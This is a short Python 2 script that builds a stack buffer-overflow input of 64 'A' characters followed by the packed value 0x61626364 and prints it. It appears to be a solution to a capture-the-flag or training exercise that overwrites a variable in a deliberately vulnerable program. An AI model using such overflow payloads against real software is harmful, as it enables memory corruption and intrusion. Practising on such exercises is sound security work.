import struct
buf = 'A'*64
ov = struct.pack('<I',0x61626364)
buf += ov
print buf 
